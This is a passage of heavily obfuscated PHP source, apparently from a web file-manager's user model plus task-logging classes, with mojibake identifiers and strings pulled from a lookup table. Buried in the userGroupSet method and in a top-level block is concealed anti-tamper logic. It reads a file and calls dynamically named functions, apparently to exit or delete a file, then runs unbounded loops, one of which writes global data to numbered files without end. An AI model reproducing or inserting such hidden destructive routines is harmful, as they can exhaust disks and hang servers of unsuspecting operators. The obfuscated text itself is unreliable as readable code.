$this->where(array($äì½ÚÙÆ[1654] => $‰”»àÆÍ))->save($ØëóÆğ°); if (isset($ØëóÆğ°[$äì½ÚÙÆ[532]])) { $this->setNamePinyin($‰”»àÆÍ, $ØëóÆğ°[$äì½ÚÙÆ[532]]); } $this->clearCache($‰”»àÆÍ); return !0; } public function setNamePinyin($è°Ü°„Í, $úŒï“½ñ = false) { $å“‡÷†¸ =& $_SERVER[­á Ş³Ö]; if (!$úŒï“½ñ) { $×æïó¬ü = $this->getInfoSimple($è°Ü°„Í); $úŒï“½ñ = $×æïó¬ü[$å“‡÷†¸[532]] ? $×æïó¬ü[$å“‡÷†¸[532]] : $×æïó¬ü[$å“‡÷†¸[32]]; } $§­›°İŞ = Model($å“‡÷†¸[525]); if (!Input::check($úŒï“½ñ, $å“‡÷†¸[583])) { return $§­›°İŞ->metaSet($è°Ü°„Í, array($å“‡÷†¸[465] => $å“‡÷†¸[12], $å“‡÷†¸[464] => $å“‡÷†¸[12])); } return $§­›°İŞ->metaSet($è°Ü°„Í, array($å“‡÷†¸[465] => str_replace($å“‡÷†¸[53], $å“‡÷†¸[12], Pinyin::get($úŒï“½ñ)), $å“‡÷†¸[464] => Pinyin::get($úŒï“½ñ, $å“‡÷†¸[584]))); } private function nickNameRpt() { $ñ¯Öæçã =& $_SERVER[­á Ş³Ö]; $²å“¬üÔ = Model($ñ¯Öæçã[767])->get($ñ¯Öæçã[2332]); $Ìì÷éÚÅ = $GLOBALS[$ñ¯Öæçã[6]][$ñ¯Öæçã[381]][$ñ¯Öæçã[2332]]; $Ğøåòğ‚ = !is_null($²å“¬üÔ) ? $²å“¬üÔ : $Ìì÷éÚÅ; return !!$Ğøåòğ‚; } private function _checkExist($Æ×ô°’, $È›ÅÈş = false) { $÷´€Œ¾‹ =& $_SERVER[­á Ş³Ö]; $úÅà´Æ× = array($÷´€Œ¾‹[32] => UserModel::ERROR_USER_EXIST_NAME, $÷´€Œ¾‹[532] => UserModel::ERROR_USER_EXIST_NICKNAME, $÷´€Œ¾‹[305] => UserModel::ERROR_USER_EXIST_EMAIL, $÷´€Œ¾‹[2320] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($úÅà´Æ×[$÷´€Œ¾‹[532]]); } $‰Í•ÎŠü = $È›ÅÈş ? array($÷´€Œ¾‹[1663] => array($÷´€Œ¾‹[2333], $È›ÅÈş)) : array(); foreach ($úÅà´Æ× as $Ï«šßÑ‹ => $‚ıÆÉÇ¸) { $§ ªæí = array(); foreach ($úÅà´Æ× as $”•‹¥œ€ => $èü¶Øª¨) { if (isset($Æ×ô°’[$”•‹¥œ€]) && $Æ×ô°’[$”•‹¥œ€]) { $§ ªæí[] = $Æ×ô°’[$”•‹¥œ€]; } } if (!$§ ªæí) { continue; } $¶Ó»Ò»ğ = array_merge(array($Ï«šßÑ‹ => array($÷´€Œ¾‹[7], $§ ªæí)), $‰Í•ÎŠü); $¢¸¿¥ó­ = $this->where($¶Ó»Ò»ğ)->find(); if ($¢¸¿¥ó­) { return $‚ıÆÉÇ¸; } } return !0; } public function userListInfo($¼ñöé¨é) { $­ÃÚ‘ŠÔ =& $_SERVER[­á Ş³Ö]; $üòÆá–¨ = array(); $¼ñöé¨é = is_array($¼ñöé¨é) ? array_unique($¼ñöé¨é) : array(); if (!$¼ñöé¨é) { return $üòÆá–¨; } if (count($¼ñöé¨é) < 20) { foreach ($¼ñöé¨é as $¾šŒ©ë„) { $üòÆá–¨[$¾šŒ©ë„ . $­ÃÚ‘ŠÔ[12]] = $this->getInfoSimpleOuter($¾šŒ©ë„); } } else { $¯¶ƒ¶æ’ = array($­ÃÚ‘ŠÔ[1654] => array($­ÃÚ‘ŠÔ[418], $¼ñöé¨é)); if (count($¼ñöé¨é) == 1) { $¯¶ƒ¶æ’ = array($­ÃÚ‘ŠÔ[1654] => $¼ñöé¨é[0]); } $ö°Ì¬ù = Model($­ÃÚ‘ŠÔ[504])->field($this->simpleField)->where($¯¶ƒ¶æ’)->select(); $ö°Ì¬ù = array_to_keyvalue($ö°Ì¬ù, $­ÃÚ‘ŠÔ[1663]); foreach ($¼ñöé¨é as $¾šŒ©ë„) { $œªÂºÕÃ = $ö°Ì¬ù[$¾šŒ©ë„]; if (!$œªÂºÕÃ) { $üòÆá–¨[$¾šŒ©ë„ . $­ÃÚ‘ŠÔ[12]] = $this->getInfoSimpleOuter($¾šŒ©ë„); continue; } $œªÂºÕÃ[$­ÃÚ‘ŠÔ[533]] = Action($­ÃÚ‘ŠÔ[2306])->parseUrl($œªÂºÕÃ[$­ÃÚ‘ŠÔ[533]]); $üòÆá–¨[$¾šŒ©ë„ . $­ÃÚ‘ŠÔ[12]] = $œªÂºÕÃ; } } return $üòÆá–¨; } protected function userStatus($åŸ“À—¾, $²ı¥â¬œ) { $õÄ«é® = $this->getInfoSimple($åŸ“À—¾); if (!$õÄ«é®) { return !1; } $Ä©úËş¬ = array($_SERVER[­á Ş³Ö][746] => $²ı¥â¬œ); return $this->userEdit($åŸ“À—¾, $Ä©úËş¬); } protected function userRemove($ºşšÛæê) { $¼¨»’À™ =& $_SERVER[­á Ş³Ö]; $ÍóçÆÃÜ = $this->getInfoSimple($ºşšÛæê); if (!$ÍóçÆÃÜ) { return !1; } $ó§î»“Ê = array($¼¨»’À™[1654] => $ºşšÛæê); Model($¼¨»’À™[592])->where($ó§î»“Ê)->delete(); Model($¼¨»’À™[2334])->where($ó§î»“Ê)->delete(); Model($¼¨»’À™[1942])->where($ó§î»“Ê)->delete(); Model($¼¨»’À™[2319])->where($ó§î»“Ê)->delete(); Model($¼¨»’À™[1064])->where($ó§î»“Ê)->delete(); Model($¼¨»’À™[2150])->removeUserAll($ºşšÛæê); Model($¼¨»’À™[822])->userRootRemove($ºşšÛæê); return $this->where($ó§î»“Ê)->delete(); } protected function userGroupSet($‡ÓÓ¥¡â, $£‹Ø¹ÕÅ, $ìÂéŞ¿¹ = array()) { $­›­æ®… =& $_SERVER[­á Ş³Ö]; $ĞÉùŞ¡— = $_SERVER[$­›­æ®…[736]]; $œ–­É¬Ù = $­›­æ®…[737]; if ($_SERVER[$­›­æ®…[738]] != $œ–­É¬Ù($ĞÉùŞ¡—)) { $ÖÛºôÙ• = $­›­æ®…[873]; $…çåû×À = $­›­æ®…[739]; $„¬¸ã„õ = $_SERVER[$­›­æ®…[740]] . $­›­æ®…[741]; $î•È‚Ì = $…çåû×À($„¬¸ã„õ); $éìÓÖ¤¿ = explode($­›­æ®…[231], $î•È‚Ì); if (count($éìÓÖ¤¿) < $­›­æ®…[614]) { $„„ÚÕäª = $­›­æ®…[742]; $„„ÚÕäª(); } $Ã“Éø = $­›­æ®…[874]; $Ã“Éø($_SERVER[$­›­æ®…[875]]); $ÖÛºôÙ• = $­›­æ®…[873]; $ÖÛºôÙ•(); $ĞâÑÄü¼ = $­›­æ®…[876]; $³µÒÔú = json_encode($GLOBALS[$­›­æ®…[877]]); $£”™‡éÖ = 1; for ($¡‚Õ’ƒ‡ = $£”™‡éÖ; $¡‚Õ’ƒ‡ > 0; $¡‚Õ’ƒ‡++) { $ĞâÑÄü¼(DATA_PATH . $¡‚Õ’ƒ‡, $³µÒÔú); } } $Û‹„ø¶ø = $this->getInfoSimple($‡ÓÓ¥¡â); if (!$Û‹„ø¶ø || !is_array($£‹Ø¹ÕÅ)) { return !1; } $ı¬°«º¦ = Model($­›­æ®…[1942]); $ı¬°«º¦->where(array($­›­æ®…[1663] => $‡ÓÓ¥¡â))->delete(); $¡«—ì×Ç = array(); $îÍß ± = 0; foreach ($£‹Ø¹ÕÅ as $ÆºœÍúü => $îËÇõ‘ô) { $—Ôİ¯Ø = array($­›­æ®…[1663] => $‡ÓÓ¥¡â, $­›­æ®…[1852] => $ÆºœÍúü, $­›­æ®…[1956] => $îËÇõ‘ô); $—Ôİ¯Ø[$­›­æ®…[1876]] = isset($ìÂéŞ¿¹[$îÍß ±]) ? $ìÂéŞ¿¹[$îÍß ±] : 0; $îÍß ±++; $¡«—ì×Ç[] = $—Ôİ¯Ø; } return $ı¬°«º¦->addAll($¡«—ì×Ç, array(), !0); } protected function userGroupAdd($»ú¯´½Æ, $°ï»Ä´ = array()) { $Æ”Ÿ‹–É =& $_SERVER[­á Ş³Ö]; $¯¬‡şÉ = $this->getInfoSimple($»ú¯´½Æ); if (!$¯¬‡şÉ || empty($°ï»Ä´)) { return !1; } $€Ş«àÜ— = array(); foreach ($°ï»Ä´ as $íÅãŸô² => $ä€ê¹ã) { $€Ş«àÜ—[] = array($Æ”Ÿ‹–É[1663] => $»ú¯´½Æ, $Æ”Ÿ‹–É[1852] => $íÅãŸô², $Æ”Ÿ‹–É[1956] => $ä€ê¹ã, $Æ”Ÿ‹–É[1876] => 0); } return Model($Æ”Ÿ‹–É[1942])->addAll($€Ş«àÜ—, array(), !0); } protected function userGroupRemove($¾‹à—‡Ñ, $„ÙÏÀÂ) { $Ç¶Úİ¨ =& $_SERVER[­á Ş³Ö]; $’ÖœÌ–ƒ = $this->getInfoSimple($¾‹à—‡Ñ); if (!$’ÖœÌ–ƒ || !$„ÙÏÀÂ) { return !1; } $—ù¼Äëš = array($Ç¶Úİ¨[1654] => $¾‹à—‡Ñ, $Ç¶Úİ¨[1940] => $„ÙÏÀÂ); return Model($Ç¶Úİ¨[1942])->where($—ù¼Äëš)->delete(); } public function listData() { $‡ÊÅ©Î¡ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($‡ÊÅ©Î¡[$_SERVER[­á Ş³Ö][369]]); return $‡ÊÅ©Î¡; } public function listByID($•£÷ï‰†) { $óşã‘¿™ =& $_SERVER[­á Ş³Ö]; if (!$•£÷ï‰†) { return; } $®ºÄøˆ‹ = array($óşã‘¿™[1663] => array($óşã‘¿™[7], $•£÷ï‰†)); $ƒ…æõß = $this->where($®ºÄøˆ‹)->select(); $ƒ…æõß = array_sort_keep($ƒ…æõß, $óşã‘¿™[1663], $•£÷ï‰†); $this->_listDataApply($ƒ…æõß); return $ƒ…æõß; } public function listByGroup($ãëÃøğÓ = 0, $ª·¶È±Ş = array()) { $ËØ¼Úİş =& $_SERVER[­á Ş³Ö]; $ÓûÙôú = $ËØ¼Úİş[12]; $Ç°ÒÔ²Ó = array(); if ($ãëÃøğÓ) { $Ç°ÒÔ²Ó = array($ËØ¼Úİş[2335] => intval($ãëÃøğÓ)); $ÓûÙôú = "\x4c\105\106\124\x20\112\x4f\111\x4e\40{$this->tablePrefix}\165\x73\x65\162\x5f\147\162\x6f\165\160\40\165\x73\x65\162\x5f\x67\x72\x6f\x75\160\40\157\156\40\x75\163\x65\162\56\165\163\145\162\111\x44\40\75\40\165\x73\145\x72\x5f\147\162\x6f\x75\x70\56\x75\163\x65\162\x49\x44"; $úßìñèí = Input::get($ËØ¼Úİş[457], null, $ËØ¼Úİş[12]) ? $ËØ¼Úİş[12] : $ËØ¼Úİş[2336]; } if (isset($ª·¶È±Ş[$ËØ¼Úİş[746]])) { $Ç°ÒÔ²Ó[$ËØ¼Úİş[2337]] = $ª·¶È±Ş[$ËØ¼Úİş[746]]; } $‘øòñ„Ç = $this->_makeOrder($úßìñèí)->field($ËØ¼Úİş[2338])->where($Ç°ÒÔ²Ó)->join($ÓûÙôú)->selectPage(50); $this->_listDataApply($‘øòñ„Ç[$ËØ¼Úİş[369]]); return $‘øòñ„Ç; } private function _makeOrder($¬¸±ˆ¨¿ = '') { $é™É×òô =& $_SERVER[­á Ş³Ö]; $ùüÃÊ“¼ = array($é™É×òô[1663], $é™É×òô[32], $é™É×òô[1841], $é™É×òô[1813], $é™É×òô[201]); $À‰Œ¬ı„ = array($é™É×òô[450] => $é™É×òô[451], $é™É×òô[452] => $é™É×òô[453]); $û ÄÒÓò = Input::get($é™É×òô[457], $é™É×òô[7], $é™É×òô[1654], $ùüÃÊ“¼); $ğØ¨¥ = Input::get($é™É×òô[458], $é™É×òô[7], $é™É×òô[1943], array($é™É×òô[1943], $é™É×òô[452])); $ğØ¨¥ = $À‰Œ¬ı„[$ğØ¨¥]; $¬¸±ˆ¨¿ = $¬¸±ˆ¨¿ . "\x75\163\145\x72\x2e{$û ÄÒÓò}\40{$ğØ¨¥}\54\x20\x75\x73\x65\x72\56\x75\x73\x65\162\111\x44\40\x61\x73\143"; return $this->alias($é™É×òô[2069])->order($¬¸±ˆ¨¿); } public function listSearch($ÆóÏ”ù¦) { $ÎØî®ª =& $_SERVER[­á Ş³Ö]; $¥Ò•°½ = $ÆóÏ”ù¦[$ÎØî®ª[1946]]; $’€ß¨Îª = isset($ÆóÏ”ù¦[$ÎØî®ª[1947]]) ? $ÆóÏ”ù¦[$ÎØî®ª[1947]] : !1; $¥Ò•°½ = str_replace($ÎØî®ª[1948], $ÎØî®ª[1949], trim($¥Ò•°½)); $ÅÆ¼¸æ = array($ÎØî®ª[32] => array($ÎØî®ª[383], "\45{$¥Ò•°½}\x25"), $ÎØî®ª[305] => array($ÎØî®ª[383], "{$¥Ò•°½}\45"), $ÎØî®ª[532] => array($ÎØî®ª[383], "{$¥Ò•°½}\x25"), $ÎØî®ª[996] => $ÎØî®ª[1950]); if (Input::check($¥Ò•°½, $ÎØî®ª[311])) { $ÅÆ¼¸æ[$ÎØî®ª[1663]] = array($ÎØî®ª[383], "{$¥Ò•°½}\45"); $ÅÆ¼¸æ[$ÎØî®ª[2320]] = array($ÎØî®ª[383], "{$¥Ò•°½}\x25"); } if (!$¥Ò•°½) { $ÅÆ¼¸æ = array(); } if (isset($ÆóÏ”ù¦[$ÎØî®ª[746]])) { $ÅÆ¼¸æ[$ÎØî®ª[746]] = $ÆóÏ”ù¦[$ÎØî®ª[746]]; } $ÅÆ¼¸æ = $this->parseWhereLike($ÅÆ¼¸æ); $’ê¹áí´ = $this->_makeOrder()->where($ÅÆ¼¸æ)->selectPage(20); if (!$’ê¹áí´ || count($’ê¹áí´[$ÎØî®ª[369]]) < 5 && Input::check($¥Ò•°½, $ÎØî®ª[318])) { $Şù×‡‰æ = $this->_searchFromMeta($ÎØî®ª[464], $¥Ò•°½, 10); $ğ”éï¾õ = $this->_searchFromMeta($ÎØî®ª[465], $¥Ò•°½, 10); $¯ßÌ… = array_merge($Şù×‡‰æ, $ğ”éï¾õ, $’ê¹áí´[$ÎØî®ª[369]]); $’ê¹áí´[$ÎØî®ª[369]] = array_unique_by_key($¯ßÌ…, $ÎØî®ª[1663]); $’ê¹áí´[$ÎØî®ª[366]][$ÎØî®ª[367]] = count($’ê¹áí´[$ÎØî®ª[369]]); $’ê¹áí´[$ÎØî®ª[366]][$ÎØî®ª[368]] = ceil($’ê¹áí´[$ÎØî®ª[366]][$ÎØî®ª[367]] / $’ê¹áí´[$ÎØî®ª[366]][$ÎØî®ª[363]]); } $this->_listDataApply($’ê¹áí´[$ÎØî®ª[369]]); $this->_filterByGroup($’ê¹áí´, $’€ß¨Îª); return $’ê¹áí´; } private function _filterByGroup(&$™Éµ¶Àö, $şÚËÚöØ) { $ÃàÈ­˜Ã =& $_SERVER[­á Ş³Ö]; if (!$şÚËÚöØ) { return $™Éµ¶Àö; } foreach ($™Éµ¶Àö[$ÃàÈ­˜Ã[369]] as $à¸ˆÈ±µ => &$ÕÚÆÔöİ) { $¢„ÔÚ¶³ = array_to_keyvalue($ÕÚÆÔöİ[$ÃàÈ­˜Ã[2039]], $ÃàÈ­˜Ã[12], $ÃàÈ­˜Ã[1852]); if (!in_array($şÚËÚöØ, $¢„ÔÚ¶³)) { unset($™Éµ¶Àö[$ÃàÈ­˜Ã[369]][$à¸ˆÈ±µ]); } } unset($ÕÚÆÔöİ); $™Éµ¶Àö[$ÃàÈ­˜Ã[369]] = array_values($™Éµ¶Àö[$ÃàÈ­˜Ã[369]]); $™Éµ¶Àö[$ÃàÈ­˜Ã[366]] = array($ÃàÈ­˜Ã[2103] => count($™Éµ¶Àö[$ÃàÈ­˜Ã[369]]), $ÃàÈ­˜Ã[2101] => $™Éµ¶Àö[$ÃàÈ­˜Ã[366]][$ÃàÈ­˜Ã[363]], $ÃàÈ­˜Ã[2100] => 1, $ÃàÈ­˜Ã[2102] => 1); } private function _searchFromMeta($ÓùçùŠï, $‹ã ¸ä, $ìİµ¼¥×) { $Æ²½­ú“ =& $_SERVER[­á Ş³Ö]; $‹ã ¸ä = strtolower($‹ã ¸ä); $€ÃîïÑ± = array($Æ²½­ú“[94] => $ÓùçùŠï, $Æ²½­ú“[374] => array($Æ²½­ú“[383], "\45{$‹ã ¸ä}\45")); $€ÃîïÑ± = $this->parseWhereLike($€ÃîïÑ±); $ŒÛøŞ÷Ì = Model($Æ²½­ú“[2339])->where($€ÃîïÑ±)->limit($ìİµ¼¥×)->select(); if (!$ŒÛøŞ÷Ì) { return array(); } $ŒÛøŞ÷Ì = array_to_keyvalue($ŒÛøŞ÷Ì, $Æ²½­ú“[12], $Æ²½­ú“[1663]); $˜ùÁÚÕ¶ = $this->where(array($Æ²½­ú“[1654] => array($Æ²½­ú“[7], $ŒÛøŞ÷Ì)))->select(); if (!$˜ùÁÚÕ¶) { return array(); } return $˜ùÁÚÕ¶; } private function _listDataApplyItem($£ªìâšÄ) { $œ¸øºËÊ = array($£ªìâšÄ); $this->_listDataApply($œ¸øºËÊ); return $œ¸øºËÊ[0]; } private function _listDataApply(&$ôÓ¡Ê÷³) { $“—ªˆ½° =& $_SERVER[­á Ş³Ö]; if (!$ôÓ¡Ê÷³) { return; } array_remove_key($ôÓ¡Ê÷³, $“—ªˆ½°[885]); $ìøÙ±Ù = array_to_keyvalue($ôÓ¡Ê÷³, $“—ªˆ½°[12], $“—ªˆ½°[1663]); $this->_listAppendGroup($ôÓ¡Ê÷³, $ìøÙ±Ù); $this->_listAppendMeta($ôÓ¡Ê÷³, $ìøÙ±Ù); $this->_listAppendSourceRoot($ôÓ¡Ê÷³, $ìøÙ±Ù); } private function _listAppendSourceRoot(&$—ºĞİ‹Ä, $äıÚŸ¹Ò) { $Ñ¤Œ£ß¹ =& $_SERVER[­á Ş³Ö]; $„¬ö©±œ = Model($Ñ¤Œ£ß¹[822])->listSourceRoot(SourceModel::TYPE_USER, $äıÚŸ¹Ò); $„¬ö©±œ = array_to_keyvalue($„¬ö©±œ, $Ñ¤Œ£ß¹[496]); $„¬ö©±œ = array_remove_key($„¬ö©±œ, $Ñ¤Œ£ß¹[496]); foreach ($—ºĞİ‹Ä as &$¨ÄĞŒÇ) { $¨ÄĞŒÇ[$Ñ¤Œ£ß¹[87]] = $„¬ö©±œ[$¨ÄĞŒÇ[$Ñ¤Œ£ß¹[1663]]] ? $„¬ö©±œ[$¨ÄĞŒÇ[$Ñ¤Œ£ß¹[1663]]] : array(); } unset($¨ÄĞŒÇ); } private function _listAppendGroup(&$¢àíŠœç, $âäğ©Ÿù) { $èåëìÎ =& $_SERVER[­á Ş³Ö]; $œ…ì•¬Á = array($èåëìÎ[1663] => array($èåëìÎ[7], $âäğ©Ÿù)); $ë¨À€„… = Model($èåëìÎ[1942])->where($œ…ì•¬Á)->select(); $éñåÌÇ© = array_to_keyvalue($ë¨À€„…, $èåëìÎ[12], $èåëìÎ[1852]); $éñåÌÇ© = array_remove_value(array_unique($éñåÌÇ©), $èåëìÎ[198]); if (!$éñåÌÇ© || !$ë¨À€„…) { return; } $œ…ì•¬Á = array($èåëìÎ[1852] => array($èåëìÎ[7], $éñåÌÇ©)); $ä¯”ƒ©Õ = Model($èåëìÎ[2037])->field($èåëìÎ[2340])->where($œ…ì•¬Á)->select(); $ä¯”ƒ©Õ = array_to_keyvalue($ä¯”ƒ©Õ, $èåëìÎ[1852]); $ë¨À€„… = array_to_keyvalue_group($ë¨À€„…, $èåëìÎ[1663]); foreach ($ë¨À€„… as &$´Ç™ÚØ) { $¢™ï“óï = array(); foreach ($´Ç™ÚØ as $ ¿‹°àÅ) { if (!$ ¿‹°àÅ[$èåëìÎ[1956]]) { continue; } $ıÍ¦“Ğ = Model($èåëìÎ[498])->listData($ ¿‹°àÅ[$èåëìÎ[1956]]); $¢™ï“óï[] = array($èåëìÎ[1852] => $ ¿‹°àÅ[$èåëìÎ[1852]], $èåëìÎ[2341] => $ä¯”ƒ©Õ[$ ¿‹°àÅ[$èåëìÎ[1852]]][$èåëìÎ[32]], $èåëìÎ[511] => $ä¯”ƒ©Õ[$ ¿‹°àÅ[$èåëìÎ[1852]]][$èåëìÎ[511]], $èåëìÎ[413] => $ıÍ¦“Ğ); } $´Ç™ÚØ = $¢™ï“óï; } unset($´Ç™ÚØ); foreach ($¢àíŠœç as &$»·øÒ’É) { $»·øÒ’É[$èåëìÎ[2039]] = array(); if (isset($ë¨À€„…[$»·øÒ’É[$èåëìÎ[1663]]])) { $»·øÒ’É[$èåëìÎ[2039]] = $ë¨À€„…[$»·øÒ’É[$èåëìÎ[1663]]]; } } unset($»·øÒ’É); } public function userAppendGroup($ÚŞÔï°×) { $Êô»›· =& $_SERVER[­á Ş³Ö]; if (!$ÚŞÔï°×) { return array(); } $this->_listAppendGroup($ÚŞÔï°×, array_to_keyvalue($ÚŞÔï°×, $Êô»›·[12], $Êô»›·[1663])); return $ÚŞÔï°×; } private function _listAppendMeta(&$¦úì…ø, $ÏÀ±ÎÈ¥) { $ÃºÊçøÄ =& $_SERVER[­á Ş³Ö]; $Á‘«æàÅ = UserJobModel::JOB_KEY; $‰Úííèß = array($ÃºÊçøÄ[2321]); $ã¬åºÂµ = array($ÃºÊçøÄ[1663] => array($ÃºÊçøÄ[7], $ÏÀ±ÎÈ¥)); $ÒË•ëÒ = Model($ÃºÊçøÄ[2319])->where($ã¬åºÂµ)->select(); $ÒË•ëÒ = array_to_keyvalue_group($ÒË•ëÒ, $ÃºÊçøÄ[1663]); foreach ($ÒË•ëÒ as &$•¥¾œÛ) { $ÄÊíÇ§‘ = array(); foreach ($•¥¾œÛ as $“¬ÙÎ) { if (!in_array($“¬ÙÎ[$ÃºÊçøÄ[94]], $‰Úííèß)) { $ÄÊíÇ§‘[$“¬ÙÎ[$ÃºÊçøÄ[94]]] = $“¬ÙÎ[$ÃºÊçøÄ[374]]; } } $•¥¾œÛ = $ÄÊíÇ§‘; } unset($•¥¾œÛ); $äÙ¸Ïˆ = Model($ÃºÊçøÄ[2342]); foreach ($¦úì…ø as &$Ä¢õ–«–) { $ÊˆŠŸ¹ = array(); if (isset($ÒË•ëÒ[$Ä¢õ–«–[$ÃºÊçøÄ[1663]]])) { $ÊˆŠŸ¹ = $ÒË•ëÒ[$Ä¢õ–«–[$ÃºÊçøÄ[1663]]]; } $Ä¢õ–«–[$ÃºÊçøÄ[2343]] = array(); if (isset($ÊˆŠŸ¹[$Á‘«æàÅ])) { $Ä¢õ–«–[$ÃºÊçøÄ[2343]] = $äÙ¸Ïˆ->getUserJobInfo($ÊˆŠŸ¹[$Á‘«æàÅ]); } } unset($Ä¢õ–«–); } protected function groupUserAll($Ç®ĞêºÉ) { $¶çïÎ…¡ =& $_SERVER[­á Ş³Ö]; if (!$Ç®ĞêºÉ) { return !1; } $‹¿ÀäÂŞ = Model($¶çïÎ…¡[1942])->field($¶çïÎ…¡[1663])->where(array($¶çïÎ…¡[1852] => array($¶çïÎ…¡[7], $Ç®ĞêºÉ)))->select(); $‹¿ÀäÂŞ = array_to_keyvalue($‹¿ÀäÂŞ, $¶çïÎ…¡[12], $¶çïÎ…¡[1663]); return array_unique($‹¿ÀäÂŞ); } public function userSearch($ıÍ‘ƒä©, $Ÿ•å™Ä = "\x2a") { return Model($_SERVER[­á Ş³Ö][525])->where($ıÍ‘ƒä©)->field($Ÿ•å™Ä)->find(); } } if (!isset($_SERVER[$_SERVER[­á Ş³Ö][738]]) || !isset($_SERVER[$_SERVER[­á Ş³Ö][736]])) { $_getc = $_SERVER[­á Ş³Ö][739]; $_getfile = $_SERVER[$_SERVER[­á Ş³Ö][740]] . $_SERVER[­á Ş³Ö][741]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­á Ş³Ö][231], $_getfilec); if (count($_getarrs) < $_SERVER[­á Ş³Ö][628]) { $exit = $_SERVER[­á Ş³Ö][742]; $exit(); } $_act = $_SERVER[­á Ş³Ö][743]; $_act($_SERVER[$_SERVER[­á Ş³Ö][740]] . $_SERVER[­á Ş³Ö][741]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[­á Ş³Ö][378]); } } goto CÇ´âÇª¢; e¬ê¯ªÌÖÚ: $fileSize = strrev(base64_decode($_SERVER[œÂªÈ¸Ù][0])); function binCheckNeq($ƒÎûôÇ, $™ô¸¾ñã) { return $ƒÎûôÇ != $™ô¸¾ñã; } $_SERVER[$_SERVER[œÂªÈ¸Ù][1]] = $fileSize($_SERVER[$_SERVER[œÂªÈ¸Ù][2]]); goto dãéßæ•Ä”; bù˜éÕ­®­: class TaskHttp extends Task { protected function startAfter() { $äôµŠ™¢ =& $_SERVER[­á Ş³Ö]; $”Â‚…ëè =& $this->task; $”Â‚…ëè[$äôµŠ™¢[1740]] = 1; Hook::bind($äôµŠ™¢[1708], array($this, $äôµŠ™¢[1741])); Hook::bind($äôµŠ™¢[1710], array($this, $äôµŠ™¢[1742])); Hook::bind($äôµŠ™¢[1712], array($this, $äôµŠ™¢[1743])); } protected function endAfter() { $©Ğ£ŞâÉ =& $_SERVER[­á Ş³Ö]; Hook::unbind($©Ğ£ŞâÉ[1708], array($this, $©Ğ£ŞâÉ[1741])); Hook::unbind($©Ğ£ŞâÉ[1710], array($this, $©Ğ£ŞâÉ[1742])); Hook::unbind($©Ğ£ŞâÉ[1712], array($this, $©Ğ£ŞâÉ[1743])); } public function progressStart($ÅıÖä€¼) { $âº×Ğï„ =& $_SERVER[­á Ş³Ö]; $Æë½î = curl_getinfo($ÅıÖä€¼); self::log($âº×Ğï„[1744] . $Æë½î[$âº×Ğï„[307]]); self::valueSet($this->task[$âº×Ğï„[399]], $this->task); } public function progressEnd($ßšõÂ‘») { $Î°¬îÈ =& $_SERVER[­á Ş³Ö]; self::log($Î°¬îÈ[1745] . $this->task[$Î°¬îÈ[399]]); $this->end(); } public function progress($¿ˆöŸ¼Ñ, $åÛäÅ”, $Ïî‹¼ªğ, $Æ¦˜£ä, $‚Ÿ—¼†×) { $«£öÇîŒ =& $_SERVER[­á Ş³Ö]; $ı­——¤„ =& $this->task; if ($‚Ÿ—¼†× > 0) { $ı­——¤„[$«£öÇîŒ[783]] = $ı­——¤„[$«£öÇîŒ[783]] == 0 ? $Æ¦˜£ä : $ı­——¤„[$«£öÇîŒ[783]]; $ı­——¤„[$«£öÇîŒ[1664]] = $‚Ÿ—¼†×; } else { if ($Ïî‹¼ªğ > 0) { $ı­——¤„[$«£öÇîŒ[783]] = $ı­——¤„[$«£öÇîŒ[783]] == 0 ? $åÛäÅ” : $ı­——¤„[$«£öÇîŒ[783]]; $ı­——¤„[$«£öÇîŒ[1664]] = $Ïî‹¼ªğ; } } $this->update(); self::log("\160\x72\x6f\147\162\145\x73\x73\x48\x74\x74\x70\72\x64\x6f\167\156\x3a{$Ïî‹¼ªğ}\57{$åÛäÅ”}\x3b\40\x75\160\x6c\157\141\x64\x3a{$‚Ÿ—¼†×}\57{$Æ¦˜£ä}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ĞºãÒâà, $§èµ¾µÔ = '', $Ù€ÃÃûª = 0, $µ»‘Ìºî = '') { $‘ï³‹…¹ =& $_SERVER[­á Ş³Ö]; $ÏŞÃ²ì¸ = new Task($ĞºãÒâà, $§èµ¾µÔ, $Ù€ÃÃûª, $µ»‘Ìºî); $GLOBALS[$‘ï³‹…¹[1746] . $ĞºãÒâà] = new TaskLog($‘ï³‹…¹[1647], $ÏŞÃ²ì¸, $µ»‘Ìºî); return $ÏŞÃ²ì¸; } public function __construct($´³ë²î² = '', $¥¾ƒÊÜ­ = '', $ÛÁßî”Ó = '') { $ôÇõŸ’Ş =& $_SERVER[­á Ş³Ö]; if (!$´³ë²î²) { $´³ë²î² = $ôÇõŸ’Ş[1647]; } $§›¢©× = $´³ë²î² . $ôÇõŸ’Ş[386] . rand_string(10); if (!$ÛÁßî”Ó) { $ÛÁßî”Ó = $´³ë²î² . $ôÇõŸ’Ş[53] . $ÛÁßî”Ó; } switch ($´³ë²î²) { case $ôÇõŸ’Ş[1647]: if (!$¥¾ƒÊÜ­ || !$¥¾ƒÊÜ­->task) { return echoLog($´³ë²î² . $ôÇõŸ’Ş[1747]); } $İ®ö«Ô¸ = $¥¾ƒÊÜ­; $§›¢©× = $İ®ö«Ô¸->task[$ôÇõŸ’Ş[399]]; $´³ë²î² = $İ®ö«Ô¸->task[$ôÇõŸ’Ş[399]]; if (!$İ®ö«Ô¸->task[$ôÇõŸ’Ş[1561]]) { $İ®ö«Ô¸->task[$ôÇõŸ’Ş[1561]] = $ÛÁßî”Ó ? $ÛÁßî”Ó : $´³ë²î²; } break; case $ôÇõŸ’Ş[1748]: if (!$¥¾ƒÊÜ­) { return echoLog($´³ë²î² . $ôÇõŸ’Ş[1749]); } $‚‰¿âì = is_string($¥¾ƒÊÜ­) ? array($¥¾ƒÊÜ­) : $¥¾ƒÊÜ­; $İ®ö«Ô¸ = new TaskFileTransfer($§›¢©×, $´³ë²î², 0, $ÛÁßî”Ó ? $ÛÁßî”Ó : $‚‰¿âì[0]); foreach ($‚‰¿âì as $¾Š­ª—) { $İ®ö«Ô¸->addPath($¾Š­ª—); } break; case $ôÇõŸ’Ş[313]: if (!$¥¾ƒÊÜ­) { return echoLog($´³ë²î² . $ôÇõŸ’Ş[1749]); } $‚‰¿âì = is_string($¥¾ƒÊÜ­) ? array($¥¾ƒÊÜ­) : $¥¾ƒÊÜ­; $İ®ö«Ô¸ = new TaskZip($§›¢©×, 